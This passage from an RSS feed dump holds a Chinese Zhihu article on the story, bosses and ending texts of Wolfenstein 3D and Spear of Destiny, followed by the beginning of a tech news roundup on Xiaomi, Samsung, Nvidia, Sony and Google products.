src=\"https://pic1.zhimg.com/v2-d2a1702d4f302785fec36046eb21cfa9_720w.png?rss\" data-caption=\"第二章关底BOSS\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-d2a1702d4f302785fec36046eb21cfa9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-5e09c0c1b146f692e9818cce56b5e725_720w.png?rss\" data-caption=\"第二章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-5e09c0c1b146f692e9818cce56b5e725\" data-watermark-src=\"v2-b052bc302cf9717040b1ec2bd0b5aad9\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>恭喜！</b></li>\n<li><b>你站在沙布斯肥胖、邪恶、肿胀腐烂的身体旁，很高兴你的任务终于结束了。他所有的笔记和设备都会被摧毁。人类可以免受他可怕的变种人大军的伤害了。</b></li>\n<li><b>然而，纳粹的暴行还在继续：虽然纳粹战争机器正在垮台，仍有无数人被关进死亡集中营。只有一种方法可以阻止这种疯狂继续……</b></li>\n</ul>\n<p><img src=\"https://pic4.zhimg.com/v2-dcc2d152f365e67cac74023aaac0d478_720w.png?rss\" data-caption=\"只比上一章的宣传语多了一句话\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-dcc2d152f365e67cac74023aaac0d478\" data-watermark-src=\"v2-213c1fb557751c5f745fa8d7ded958bd\" data-private-watermark-src=\"\"></p>\n<ul>\n<li>任务：消灭希特勒 </li>\n<li>在第三章中，当第三帝国瓦解之时，希特勒藏在巨型地堡中。你的任务就是刺杀他，结束他的疯狂统治。你发现他逃到了国会大厦，你必须去那面对他。  </li>\n<li>如果你喜欢德军总部，你也同样会喜欢前传三部曲——夜行任务！拥有额外三十个激烈火爆、极具挑战的关卡！</li>\n</ul>\n<h2>—第三章：死吧，元首，死吧！（Die, Fuhrer, Die!）</h2>\n<p>本章秘密关卡非常有意思，我们可以看到《吃豆人》中的幽灵。由于幽灵是打不死的，只能跑，一边被其追逐，一遍过关，非常有意思。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bf6c16a1a305a0a5364af2f9034906fe_720w.png?rss\" data-caption=\"吃豆人幽灵入侵德军总部\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-bf6c16a1a305a0a5364af2f9034906fe\" data-watermark-src=\"v2-8184a384885aa1b9138279e1def43d46\" data-private-watermark-src=\"\"></p>\n<p>关底BOSS为希特勒，总共有三种形态，一种是巫师形态（假希特勒），会发射火球，击败后会留下衣服逃脱重生，一种是机甲形态，装甲被击碎后，会脱下机甲，最终被击败后同样会有死亡回放。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fcab8d76f05157304e789779e765dab2_720w.png?rss\" data-caption=\"第一种形态一般认为是假希特勒，后两种才是真身\" data-size=\"normal\" data-rawwidth=\"128\" data-rawheight=\"64\" data-watermark=\"original\" data-original-src=\"v2-fcab8d76f05157304e789779e765dab2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8e7c5b37bfe384db995121dd2071b2a2_720w.png?rss\" data-caption=\"第三章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-8e7c5b37bfe384db995121dd2071b2a2\" data-watermark-src=\"v2-2560e4e9502aba1117ea21cf177d604e\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>恭喜！</b></li>\n<li><b>邪恶的绝对化身，阿道夫·希特勒，躺在你脚下他自己的血泊中。他那布满皱纹、满是鲜血的脸扭曲着，参差不齐的歪嘴似乎要哭嚎出来。死了也这么疯狂。你因惨胜嘴唇紧闭，一脚踢下他的头颅，朝着尸体啐了一口。</b></li>\n<li><b>万岁……呵。万你个鬼。</b></li>\n</ul>\n<p><img src=\"https://pic4.zhimg.com/v2-ddc628a5089ccef3985c1b0422d13d22_720w.png?rss\" data-caption=\"后三章的宣传——“但是，冒险才刚刚开始！”\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-ddc628a5089ccef3985c1b0422d13d22\" data-watermark-src=\"v2-c50f566478b5300a7b380c8cba31315a\" data-private-watermark-src=\"\"></p>\n<p>如果你喜欢德军总部，你也同样会喜欢前传三部曲——夜行任务！拥有额外三十个激烈火爆、极具挑战的关卡！B. J.在纳粹计划大规模化学战的时候与其作战。 与Otto Giftmacher，Gretel Grosse和Fettgesicht将军战斗吧！</p>\n<h2>—第四章：黑暗秘密（A Dark Secret）</h2>\n<p>后三章“夜行任务”一开始是单卖的，后来才和前三章整合到一起发行。秘密关卡可以通过潜行通过，关底BOSS为化学战的科学家Otto Giftmacher，会发射火箭炮，同样会有死亡回放。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6b4130b5269f5385fcab79d217d00ef2_720w.png?rss\" data-caption=\"第四章关底BOSS\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-6b4130b5269f5385fcab79d217d00ef2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d31d51aa20889281a848d1f36e7a95de_720w.png?rss\" data-caption=\"第四章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-d31d51aa20889281a848d1f36e7a95de\" data-watermark-src=\"v2-8d0bd998e2aebfbe6990d9043bdb5e46\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>疯狂的Otto Giftmacher已经死了！</b></li>\n<li><b>化学战背后扭曲的科学家躺在你的脚下，但是他劳动果实长在了别的地方！第一波的化学战马上要来了。在重兵把守的埃尔兰根（Erlangen）堡垒中，存放着即将到来的毒药战争（Giftkrieg）的计划书。找出它们，你将得知从哪里找到这场致命袭击的领导——Fettgesicht将军。</b></li>\n</ul>\n<p><img src=\"https://pic2.zhimg.com/v2-2e2df15e4fb5e153459d9048c91d92c4_720w.png?rss\" data-caption=\"下一场冒险在等待！还等什么……开始下一场冒险，找到那些计划书！\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-2e2df15e4fb5e153459d9048c91d92c4\" data-watermark-src=\"v2-f9485925475a38629ee8c7315329e93e\" data-private-watermark-src=\"\"></p>\n<h2>—第五章：狂人踪迹（Trail of the Madman）</h2>\n<p>本章关底的BOSS是位女性——Gretel Grosse（整个游戏中的唯一女性），是第一章的BOSS的妹妹，攻击方式和他兄弟一样，被击败后不会有死亡回放。最后，镜头又会如第一章一样一转，看到兴奋的B. J.一跃而起。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b17cfef63533c416ef001f0d519a3201_720w.png?rss\" data-caption=\"第五章关底BOSS\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-b17cfef63533c416ef001f0d519a3201\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4153e605bb236b378dea76e40bc934ef_720w.png?rss\" data-caption=\"第五章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-4153e605bb236b378dea76e40bc934ef\" data-watermark-src=\"v2-155fe6b9a905ce88fba41e18e5c355fb\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>计划书在你手里了！</b></li>\n<li><b>女巨人Gretel Grosse倒下了。希望他的兄弟汉斯（Hans）对此别生气……</b></li>\n<li><b>现在冲向奥芬巴赫（Offenbach）的军事设施，在化学战致命、烧灼的云团杀死无数人之前阻止这场恐怖的袭击。只有你能做到，B. J.。</b></li>\n</ul>\n<p><img src=\"https://pic1.zhimg.com/v2-bb67f9551767eb869775db2f60684da2_720w.png?rss\" data-caption=\"终结将至！在Fettgesicht将军开始痛苦与毁灭的疯狂计划之前去干掉他！\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-bb67f9551767eb869775db2f60684da2\" data-watermark-src=\"v2-b585bc91d61ec19929238481695acd6b\" data-private-watermark-src=\"\"></p>\n<h2>—第六章：对抗（Confrontation）</h2>\n<p>本章秘密关卡中有所有类型的普通敌人，有三个第一章的BOSS——Hans Grosse（或许是他的兄弟们），甚至还有一个吃豆人的幽灵。关底BOSS为Fettgesicht将军，一边发射火箭炮，一边使用机枪，被击败后能看到死亡回放。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cebd63220909de993df8609a596e2a83_720w.png?rss\" data-caption=\"第六章关底BOSS\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-cebd63220909de993df8609a596e2a83\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c8fa93201bf91efe39e291dd24f5632b_720w.png?rss\" data-caption=\"第六章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-c8fa93201bf91efe39e291dd24f5632b\" data-watermark-src=\"v2-6a8ef392b784f30e847d79ba70543ba0\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>恭喜！</b></li>\n<li><b>将军咽下最后一口气，自由世界免于纳粹的恐怖化学战争的伤害。你回到盟军总部中，一枚荣誉勋章正等着你。</b></li>\n<li><b>盟军指挥官告诉你海尔汉默城堡附近的一些罪恶行径。一些关于灰白色皮肤的疯狂士兵的事情……</b></li>\n</ul>\n<p><img src=\"https://pic4.zhimg.com/v2-d970ddb33587b6512a2d0e2eeb924f7b_720w.png?rss\" data-caption=\"说不定这就是ID那帮人的梦想\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-d970ddb33587b6512a2d0e2eeb924f7b\" data-watermark-src=\"v2-dd3c1d95f8b4c28ede8428ece086d3dc\" data-private-watermark-src=\"\"></p>\n<ul>\n<li>你做到了！</li>\n<li>你完成了德军总部的第六章！</li>\n<li>你真是最伟大的英雄之一！世界欢呼着你的名字！你和总统一起拍了照！人们用你的名字给他们的婴儿命名！你娶了一位电影明星！是的！你太酷了！</li>\n<li>剧终</li>\n</ul>\n<h2>·《德军总部3D：命运之矛 (Spear of Destiny)》</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-9333dc097d06e5f1cbf9b022a115dac8_720w.jpeg?rss\" data-caption=\"《命运之矛》的封面，但是比起《德军总部3D》，B. J.看起来更稚嫩，缺了不少硬汉气概\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"967\" data-watermark=\"original\" data-original-src=\"v2-9333dc097d06e5f1cbf9b022a115dac8\" data-watermark-src=\"v2-90d0c4b393293dcb3056ef3b988efd41\" data-private-watermark-src=\"\"></p>\n<p>由于《德军总部3D》取得了很大的成功，ID又在同年推出了资料片《命运之矛 (Spear of Destiny)》，沿用了正篇绝大多数的资源，添加了一些新的纹理，音乐，敌人和BOSS等，包含21个新关卡。两年后，两个任务包《Return to Danger》和《Ultimate Challenge》推出，各有21关，最终被整合到了《命运之矛》中。</p>\n<p>《命运之矛》是《德军总部3D》的前传，是的，《德军总部3D》里面已经有前传了，这里又是前传。我估计ID那帮人对仅在第三章就把希特勒打死很后悔，第六章紧紧和第一章衔接，中间插不进去，又把结局写完了，后面只能不停地搞前传。《命运之矛》的三个任务包的流程几乎一样，只是贴图、关卡设计和BOSS有所不同。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fb7423eb8d687b2e7c619e49b4f3e975_720w.jpeg?rss\" data-caption=\"《命运之矛》开场画面\" data-size=\"normal\" data-rawwidth=\"1360\" data-rawheight=\"768\" data-watermark=\"original\" data-original-src=\"v2-fb7423eb8d687b2e7c619e49b4f3e975\" data-watermark-src=\"v2-d23838940e3e29baef0806398382d600\" data-private-watermark-src=\"\"></p>\n<h2>—《命运之矛 (Spear of Destiny)》</h2>\n<p>《命运之矛》同样也有说明手册，感兴趣的玩家可以点击<b><a href=\"http://link.zhihu.com/?target=http%3A//legacy.3drealms.com/tech/manuals/Spear%2520of%2520Destiny.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">下载</a></b>。手册中除了至今的故事（The Story So Far），前面还有“当阿道夫·希特勒掌权时……（As Adolf Hitler Rises to Power……）”的额外背景说明。</p>\n<p><b>当阿道夫·希特勒掌权时……（As Adolf Hitler Rises to Power……）</b></p>\n<ul>\n<li><i>伴随着冷钢灼铅（cold steel and hot lead）的力量，希特勒决定将自己的祖国塑造成荣耀的第三帝国——一个崭新的神圣帝国。年轻时，希特勒渴望成为牧师，但是现在他把目标定的高不可及。他把自己比作救世主弥赛亚，声称所说的都是上帝的旨意，他深深跌入了自己扭曲玄秘的思维陷阱中。这个疯子渴求二次降临（注：耶稣再临），这使他到处寻找基督教的传奇圣物。</i></li>\n<li><i>希特勒最想得到的圣器就是“命运之矛”，基督被挂在十字架上的时候用于刺破他肋旁的那把武器。根据传说，拥有这柄矛的人是不败的。几个世纪以来，普鲁士和德国的领袖带着这把矛战无不胜。但第一次世界大战之后，它被从德国带走，放到了凡尔赛宫博物馆的玻璃之下。希特勒决意将其取回，德国通过闪电（blitzkrieg）战袭击法国之后，这柄矛很快从凡尔赛宫中被带走，运到了德国的要塞中。</i></li>\n<li><i>由于握于勇士的手中，因基督的血成圣，这柄矛成了希特勒珍惜的宝贝。拿着它，希特勒坚信自己是不可战胜的。让上帝领导他的行动，一个疯子的确信，“一个梦游者的保证”，他向整个欧洲派出军队。没人能对抗闪电战的可怕力量，几百万人沦为希特勒军队的牺牲品。</i></li>\n</ul>\n<p><b>至今的故事（The Story So Far）</b></p>\n<ul>\n<li><i>你是威廉·J·布拉斯科维奇，又称B. J.，盟军间谍中的坏小子，专门执行终极行动。有传言说希特勒利用命运之矛后变得更加异乎寻常。希特勒的死亡部长，恐怖的沙布斯博士正利用这柄矛唤醒死人来实现他的科学狂想。</i></li>\n<li><i>在盟军总部中你和大多数人一样，都对这柄矛的力量是否有效而深深的怀疑，只把故事当成纳粹的宣传，对此不屑一顾。你的只相信铅弹（lead）的力量，那些迷信之言只是童话故事。然而，你意识到拿到命运之矛这件事更是将早已不平衡的阿道夫推向边缘！无论如何，你的命令都很明确：潜入纽伦堡（Nuremberg）的要塞中取得那柄矛。</i></li>\n</ul>\n<p><b>现在……</b></p>\n<ul>\n<li><i>你已到达敌军后方，纳粹堡垒下方很深的树丛之中。一处下水道引向堡垒最底层的地牢之中。上面就是巨大的堡垒了，其中就存放着可以控制人类命运的东西。几百名纳粹士兵和几千发子弹挡在你的路上！你悄悄地进入了满是苔藓的下水道。</i></li>\n<li><i>塔楼高处的里面突然射出一股非自然的荧光（恰如上面的开场画面），你不知是什么，而附近的守卫则完全没有注意到。感觉好像有种被监视着的感觉，你轻轻地往手枪中插入一个新弹匣，准备应对前面的状况。但是，这世上没什么能让你对前面的战斗做好万全准备，一场为了命运之矛的战斗！</i></li>\n</ul>\n<p>进入游戏后，你向后一张望就能看见外面的景色，第五、十、十六和十八关都是BOSS关卡。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-869be6c088a42b61de546ac2bdb0d0a3_720w.png?rss\" data-caption=\"第五关关底BOSS——Trans Grosse，格罗塞家族的又一名成员，和他的亲戚发色不同，但长得很像，盔甲有所不同\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-869be6c088a42b61de546ac2bdb0d0a3\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5ef71f49bb96d9482f2dbce961c20023_720w.png?rss\" data-caption=\"第十关BOSS——Barnacle Wilhelm\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-5ef71f49bb96d9482f2dbce961c20023\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-29ba1611f18de65c3c9967faea2709b6_720w.png?rss\" data-caption=\"第十六关BOSS——Übermutant，变种人，除了四只手臂扔飞刀，胸口还有机枪\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-29ba1611f18de65c3c9967faea2709b6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-633c4e7ce06969966c6ff85f91321a56_720w.png?rss\" data-caption=\"第十八关BOSS——死亡骑士（Death Knight）\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-633c4e7ce06969966c6ff85f91321a56\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-cee30d77f2f9255ae6a2817fd005343e_720w.jpeg?rss\" data-caption=\"这就是最终的关键道具——命运之矛，在这里可以无缝接入下一关\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-cee30d77f2f9255ae6a2817fd005343e\" data-watermark-src=\"v2-70bad03069b05089cf5a66382024c8fa\" data-private-watermark-src=\"\"></p>\n<p>当我们击败死亡骑士的时候，就可以开门拿到命运之矛，原本以为这就结束了，但是出人意料的是当我们拿到命运之矛走出房间时，才发现外面的一切都改变了！我们被吸入了地狱般的场景中！此时，周围有无数的鬼魂，更有恐怖的最终BOSS——死亡天使，它准备看看你是否有资格获得命运之矛，将其击败后我们看到B. J.一手握着命运之矛，一手拿着枪管已经烧红的机枪，因为受伤过重倒了下去，然后才能看到结束画面。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-758e7fc32bc6896070cd8c170cef28a5_720w.jpeg?rss\" data-caption=\"大家当时刚打完BOSS，浑身都是胜利后的轻松，就等着看结局动画了，结果竟然看到这一幕，都被吓了一跳，我刚不是还在打纳粹吗？What the...\" data-size=\"normal\" data-rawwidth=\"1439\" data-rawheight=\"1079\" data-watermark=\"original\" data-original-src=\"v2-758e7fc32bc6896070cd8c170cef28a5\" data-watermark-src=\"v2-c9a14ed93247621545482bb7bc787ffa\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c57a9abc84587b2510d5548726da144f_720w.png?rss\" data-caption=\"《命运之矛》关底结束语，你回到了人间\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-c57a9abc84587b2510d5548726da144f\" data-watermark-src=\"v2-f87a79411091af36761ecc5f977a3b32\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><i>盟军在离冒着烟的纽伦堡要塞废墟不远处的一座遍布青草的小山上发现了你，你受伤的手里紧紧握住命运之矛。你在那一动不动，身上冒着一缕青烟，你身下的青草有被火烧过的迹象。</i></li>\n<li><i>在盟军医院中，你没告诉任何人你与死亡天使那可怕的最终一战，以免其它人认为你疯了。但是，在你的记忆之中你仍然承受着城堡里其它强大敌人给你留下的伤疤，黑暗、致命，仿佛就在眼前。所有的战斗都是为了保卫这件神圣的遗物，只是保证希特勒那扭曲的梦想延续下去。</i></li>\n<li><i>命运之矛已经没了，第三帝国将会崩塌。希望它再也不会崛起了。</i></li>\n</ul>\n<p><img src=\"https://pic3.zhimg.com/v2-d62e3f6822919e6ce1f61961f8ad74a7_720w.jpeg?rss\" data-caption=\"布拉斯科维奇先生，我们欠你一个很大的情，你很好的服务了你的国家。命运之矛已经没了，盟军终于能摧毁希特勒了……\" data-size=\"normal\" data-rawwidth=\"1201\" data-rawheight=\"899\" data-watermark=\"original\" data-original-src=\"v2-d62e3f6822919e6ce1f61961f8ad74a7\" data-watermark-src=\"v2-755e4b8ad23fa013fc1c07c6f5a5b303\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d6e83120ab0e32c515dcb975afe330ea_720w.jpeg?rss\" data-caption=\"但那就是另一个故事了……\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-d6e83120ab0e32c515dcb975afe330ea\" data-watermark-src=\"v2-6b271f130f9f6675c437b2321123629a\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0b8ebc70f33f552ec99ee26db8a32eb8_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-0b8ebc70f33f552ec99ee26db8a32eb8\" data-watermark-src=\"v2-9ee5df3fd03769256f27087ae4c2dd43\" data-private-watermark-src=\"\"></p>\n<h2>—《重返危险（Return to Danger）》&amp;《终极挑战（Ultimate Challenge）》</h2>\n<p>这两个任务包要更难，受到的负面评价也比较多。里面有很多诡异的蓝色，连手枪都是蓝色的，而且有些关卡必须通过推墙才能找到钥匙过关，打破了完全不知道秘密存在也能过关的默契（秘密关卡除外）。如果你直接玩游戏，会发现除了地图安排等等不一样，关卡设置和头一个任务包都一样，甚至击败死亡天使之后出现的关底文字，之后的剧情图片都完完全全一样，我们几乎不用在乎两个补充包的剧情（也没法在乎），只体验关卡和不同的BOSS即可（我也不逐个贴出来了，俩任务包里居然连很多BOSS都是重复的）。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7fb50351d4ea9abe68736286954eaf33_720w.jpeg?rss\" data-caption=\"只有在包装盒的背面有两个任务包的简要剧情介绍，纯粹写着玩的，右边终极挑战那个真的是瞎写的，完全跟游戏内文字矛盾，我都不太想翻译\" data-size=\"normal\" data-rawwidth=\"1621\" data-rawheight=\"976\" data-watermark=\"original\" data-original-src=\"v2-7fb50351d4ea9abe68736286954eaf33\" data-watermark-src=\"v2-c03513cdbf27f64f97ea27ed435faf36\" data-private-watermark-src=\"\"></p>\n<p><b>不能再来一次了！</b></p>\n<ul>\n<li><i>自从命运之矛被从敌人手中夺过来已经过去6个星期了，轴心国发动了一场成功的突击队袭击来夺回它！在血腥的战斗过后，他们侥幸逃脱，将其带到了纳粹秘密的斯堪的纳维亚（Scandinauian）基地，那是从峡湾坚固的岩石中挖出来的。据说这座堡垒是坚不可摧的！</i></li>\n<li><i>你的任务就是再次把它夺回来。</i></li>\n</ul>\n<p><b>核子恐惧！</b></p>\n<ul>\n<li><i>作为盟军的顶级特工，你将面临迄今为止最为严峻的挑战！希特勒从过去的错误中吸取了教训，他在柏林的国会大厦下面扩建了他的地下指挥掩体，因此他能把命运之矛放在自己旁边，并好好守卫着！</i></li>\n<li><i>希特勒召唤了神秘的黑暗势力，他能洞察未来，并从未来获得武器系统的计划书！</i></li>\n</ul>\n<p>唯一还值得一提的是，《终极挑战（Ultimate Challenge）》的最后一关，也就是面对死亡天使的那个关卡，地图风格是《DOOM》的，都能看到写着“U.A.C.”的箱子，因为那时候《DOOM》早已发售，我们居然完成了在《毁灭战士》中玩《德军总部》，在《德军总部》中玩《毁灭战士》的闭环。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6a0445c14f572c3a5aed48d5811b19d9_720w.jpeg?rss\" data-caption=\"结束\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-6a0445c14f572c3a5aed48d5811b19d9\" data-watermark-src=\"v2-6d6f82def53a6cc8a81422b6dc01f042\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bing-he-xi-jian-61?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">冰河洗剑</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/425097623/answer/2046791153?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/67141710?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《重返德军总部》？</a><br><a href=\"http://www.zhihu.com/question/336835965?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价游戏《德军总部：新血脉》？</a><br>\n","link":"http://www.zhihu.com/question/425097623/answer/2046791153?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：小米发布小米 MIX 4 等多款新品、三星公布 Exynos W920 可穿戴芯片等","date":"2021-08-11 00:49:10","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>小米发布小米 MIX 4、小米平板 5 系列等多款新品</h3>\n<p>8 月 10 日，小米在 2021 雷军年度演讲暨小米秋季新品发布会上发布多款新品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49hkn5b34tdfon49s2g.jpeg\"><figcaption>小米 MIX 4 | 图：小米官网</figcaption></figure><p>小米 MIX 4 采用 6.67 英寸、FHD+ 分辨率、最高 120Hz 刷新率的 CUP 工艺全面屏，屏下前置摄像头区域像素密度 400 PPI；机身采用一体化陶瓷材质，整机重量为 225g；搭载高通骁龙 888+ 处理器，最高可选 12GB+512GB 配置方案；内置等效 4500mAh 容量电池，支持 120W 有线快充、50W 无线快充和 10W 无线反向充电；后置搭载 1 亿像素三摄方案，支持 120° 自由曲面超广角拍摄和 5 倍光学变焦拍摄；此外小米 MIX 4 还配备了哈曼卡顿立体声双扬声器和 UWB 超宽带通讯技术。小米 MIX 4 提供陶瓷黑、陶瓷白和影青灰三种配色可选，售价 4999 元起（8GB+128GB）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49hkndb34tdfuvpsdd0.png\"><figcaption>小米平板 5 | 图：小米官网</figcaption></figure><p>小米平板 5 系列配备 11 英寸、2.5K 分辨率、最高 120Hz 刷新率 LCD 屏幕，支持 HDR10、杜比视界和真彩显示，全系搭载大屏定制版 MIUI 12.5。其中小米平板 5 搭载高通骁龙 860 处理器、8720mAh 容量电池、4 环绕声扬声器、6GB 运行内存和最高 256GB 存储空间，小米平板 5 Pro 搭载高通骁龙 870 处理器、8600mAh 容量电池、8 环绕声扬声器、最高 8GB 运行内存和 256GB 存储空间（5G 版本）。小米平板 5 提供黑、白、绿三色可选，售价 1999 元起；小米平板 5 Pro 提供黑、白两色可选，售价 2499 元起。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49hkndb34tdfon49s30.png\"><figcaption>小米 Sound | 图：小米官网</figcaption></figure><p>此外小米还在本次发布会上发布了配备 2.25 英寸 12W 扬声器单元、支持哈曼卡顿调音、360° 全向出音和 UWB 音乐接力等功能的小米 Sound 智能音箱，售价 499 元；采用新一代 V21 OLED 面板、120Hz 刷新率、支持 UWB 连接、Wi-Fi 6、Xbox 官方认证的小米电视大师 77” OLED 版，售价 19999 元；以及提供 55、65 两种尺寸可选的小米电视 6 系列，售价 5699 元起。</p>\n<h3>三星正式公布 Exynos W920 可穿戴芯片</h3>\n<p>三星于 8 月 10 日正式推出首款 5nm 制程可穿戴芯片 Exynos W920，该芯片组包含两个 ARM Cortex-A55 内核和 Cortex-M55 内核，兼顾性能和续航；显示部分集成了 ARM Mali-G68 GPU，相较上一代产品 CPU 性能提升 20%，GPU 性能提升 10倍，可以在分辨率 960×540 屏幕界面上带来更加流畅的滚动、刷新体验。此外该芯片组还加入了嵌入式的 4G LTE Cat.4 调制解调器，以及用于在户外活动期间追踪速度、距离和海拔的 GNSS L1 全球卫星导航模块。<a href=\"https://news.samsung.com/global/samsung-introduces-the-industrys-first-5nm-processor-powering-the-next-generation-of-wearables\" target=\"_blank\">来源</a></p>\n<h3>英伟达推出 RTX A2000 显卡</h3>\n<p>8 月 10 日，英伟达正式推出面向工作站的 RTX A2000 显卡，该显卡采用了 Nvidia Ampere 架构，配备了 3328 个 CUDA 核心以及 6GB 的 GDDR 内存，并在能耗上进行了优化处理。<a href=\"https://www.theverge.com/2021/8/10/22618030/nvidia-rtx-a2000-gpu-workstation-specs-features-price\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49hkntb34tdfuvpsddg.png\"><figcaption>NVIDIA GPU A 系列 | 图：The Verge</figcaption></figure><h3>索尼完成对 Crunchyroll 的 11.75 亿美元收购</h3>\n<p>索尼影业于 8 月 9 日宣布正式完成对 AT&amp;T 旗下动漫巨头 Crunchyroll 的 11.75 亿美元收购，至此索尼已拥有 Crunchyroll 和 Funimation 这两大动漫串流服务平台，未来将整合更为统一的动漫订阅服务。目前 Crunchyroll 已经拥有 500万订阅用户和 1.2 亿注册用户。<a href=\"https://cn.engadget.com/sony-completes-crunchyroll-acquisition-120036362.html\" target=\"_blank\">来源</a></p>\n<h3>Google 推出新款 Titan 实体安全密钥</h3>\n<p>8 月 9 日 ，Google 官方更新博客信息，宣布推出新款 Titan 实体安全密钥，该实体密钥提供 USB-A 和 USB-C 两个版本，均支持 NFC 功能，用户在使用时，只需要通过手机的 NFC 